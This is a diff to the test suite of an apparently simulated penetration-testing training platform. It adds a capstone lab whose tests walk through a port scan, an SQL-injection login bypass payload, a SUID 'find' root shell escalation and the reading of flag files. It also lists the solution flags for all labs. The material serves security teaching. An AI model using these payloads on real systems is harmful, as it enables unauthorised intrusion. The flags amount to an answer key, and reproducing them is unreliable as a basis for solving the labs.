@@ -580,9 +580,58 @@ async function runAllTests() {
   });
 
   // -------------------------------------------------------------------------
-  // 13. GLOBAL FLAG VERIFICATION TESTS (ALL 12 LABS)
+  // 13. LAB 13: Capstone Pentest: Final Enterprise Target
   // -------------------------------------------------------------------------
-  console.log('\n--- VERIFYING FLAGS FOR ALL 12 LABS ---');
+  console.log('\n--- LAB 13: lab-capstone ---');
+  LabEngine.resetLab('lab-capstone');
+
+  await asyncTest('Task 1: nmap -sV -p 22,80 10.10.10.100 scans target', async () => {
+    const res = await LabEngine.execute('lab-capstone', 'nmap -sV -p 22,80 10.10.10.100');
+    assert.strictEqual(res.exitCode, 0);
+    assert.ok(res.stdout.includes('22/tcp'));
+    assert.ok(res.stdout.includes('80/tcp'));
+    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [0]);
+  });
+
+  await asyncTest('Task 2: curl discovers administrative login at /api/v2/auth', async () => {
+    const res = await LabEngine.execute('lab-capstone', 'curl http://10.10.10.100/api/v2/auth');
+    assert.strictEqual(res.exitCode, 0);
+    assert.ok(res.stdout.includes('/api/v2/auth'));
+    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [1]);
+  });
+
+  await asyncTest('Task 3: curl with SQLi payload bypasses authentication', async () => {
+    const res = await LabEngine.execute('lab-capstone', `curl -X POST -d "user=admin'--&pass=x" http://10.10.10.100/api/v2/auth`);
+    assert.strictEqual(res.exitCode, 0);
+    assert.ok(res.stdout.includes('flag{sqli_bypass_auth_v2_ok}'));
+    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [2]);
+  });
+
+  await asyncTest('Task 4: cat user.txt retrieves initial access flag', async () => {
+    const res = await LabEngine.execute('lab-capstone', 'cat user.txt');
+    assert.strictEqual(res.exitCode, 0);
+    assert.ok(res.stdout.includes('flag{cadet_initial_foothold_access_2026}'));
+    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [3]);
+  });
+
+  await asyncTest('Task 5: find SUID breakout escalates to root', async () => {
+    const res = await LabEngine.execute('lab-capstone', 'find . -exec /bin/sh -p \\; -quit');
+    assert.strictEqual(res.exitCode, 0);
+    assert.ok(res.stdout.includes('Privilege boundary bypassed'));
+    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [4]);
+  });
+
+  await asyncTest('Task 6: cat /root/root.txt verifies capstone completion flag', async () => {
+    const res = await LabEngine.execute('lab-capstone', 'cat /root/root.txt');
+    assert.strictEqual(res.exitCode, 0);
+    assert.ok(res.stdout.includes('flag{endlessus_capstone_certified_junior_pentester_2026}'));
+    assert.deepStrictEqual(res.newlyCompleted.map(t => t.index), [5]);
+  });
+
+  // -------------------------------------------------------------------------
+  // 14. GLOBAL FLAG VERIFICATION TESTS (ALL 13 LABS)
+  // -------------------------------------------------------------------------
+  console.log('\n--- VERIFYING FLAGS FOR ALL 13 LABS ---');
   const flagsToTest = [
     { labId: 'lab-headers', flag: 'flag{strict_transport_security_csp}' },
     { labId: 'lab-permissions', flag: 'flag{chmod_600_config_rw}' },
@@ -595,7 +644,8 @@ async function runAllTests() {
     { labId: 'lab-logs', flag: 'flag{failed_ssh_brute_force_192_168_1_50}' },
     { labId: 'lab-suid', flag: 'flag{suid_find_root_euid0}' },
     { labId: 'lab-jwt', flag: 'flag{none_algorithm_signature_verification}' },
-    { labId: 'lab-crypto', flag: 'flag{aes_gcm_authenticated_encryption}' }
+    { labId: 'lab-crypto', flag: 'flag{aes_gcm_authenticated_encryption}' },
+    { labId: 'lab-capstone', flag: 'flag{endlessus_capstone_certified_junior_pentester_2026}' }
   ];
 
   flagsToTest.forEach(({ labId, flag }) => {
